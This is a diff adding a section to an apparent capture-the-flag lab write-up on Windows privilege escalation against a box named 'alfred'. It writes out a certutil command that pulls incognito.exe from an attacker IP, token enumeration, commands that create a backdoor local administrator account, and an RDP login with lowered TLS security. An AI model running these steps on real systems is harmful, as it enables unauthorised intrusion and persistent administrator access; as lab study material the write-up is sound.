@@ -139,7 +139,73 @@ Then we can repeat the previous steps, change the command (1) to get a reverse s
 
 Build again the project and you should get a reverse shell on your attacker machine
     
-    
+### Priv esc using incognito standalone
+https://github.com/FSecureLABS/incognito/blob/394545ffb844afcc18e798737cbd070ff3a4eb29/incognito.exe
 
+Download from the victim:
+
+     certutil -urlcache -split -f "http://10.9.0.171:8000/incognito.exe" "incognito.exe" 
+    
+Now we can list the available tokens:
+
+    incognito.exe list_tokens -u 
+    [-] WARNING: Not running as SYSTEM. Not all tokens will be available.
+    [*] Enumerating tokens
+    [*] Listing unique users found
+    
+    Delegation Tokens Available
+    ============================================
+    alfred\bruce 
+    IIS APPPOOL\DefaultAppPool 
+    NT AUTHORITY\IUSR 
+    NT AUTHORITY\LOCAL SERVICE 
+    NT AUTHORITY\NETWORK SERVICE 
+    NT AUTHORITY\SYSTEM 
+    
+    Impersonation Tokens Available
+    ============================================
+    NT AUTHORITY\ANONYMOUS LOGON 
+    
+    Administrative Privileges Available
+    ============================================
+    SeAssignPrimaryTokenPrivilege
+    SeCreateTokenPrivilege
+    SeTcbPrivilege
+    SeTakeOwnershipPrivilege
+    SeBackupPrivilege
+    SeRestorePrivilege
+    SeDebugPrivilege
+    SeImpersonatePrivilege
+    SeRelabelPrivilege
+    SeLoadDriverPrivilege
+
+Since we cannot use none of the available delegation tokens, we can try to add a user to local administrator using incognito:
+
+    incognito.exe add_user catwoman Pwd1234! && incognito.exe add_localgroup_user Administrators catwoman 
+    ...
+    [-] WARNING: Not running as SYSTEM. Not all tokens will be available.
+    [*] Enumerating tokens
+    [*] Attempting to add user catwoman to host 127.0.0.1
+    [+] Successfully added user
+    [-] WARNING: Not running as SYSTEM. Not all tokens will be available.
+    [*] Enumerating tokens
+    [*] Attempting to add user catwoman to local group Administrators on host 127.0.0.1
+    [+] Successfully added user to local group
+
+Checl it out:
+
+   
+    net user catwoman
+    User name                    catwoman
+    Full Name                    catwoman
+    ...
+    Local Group Memberships      *Administrators       
+
+
+Now since RDP is enabled we can access alfred as catwoman user (set tls-seclevel:0 to avoid tls connection error)
+
+    xfreerdp /u:"alfred\catwoman" /v:10.10.36.188 /tls-seclevel:0
+
+    
 
 
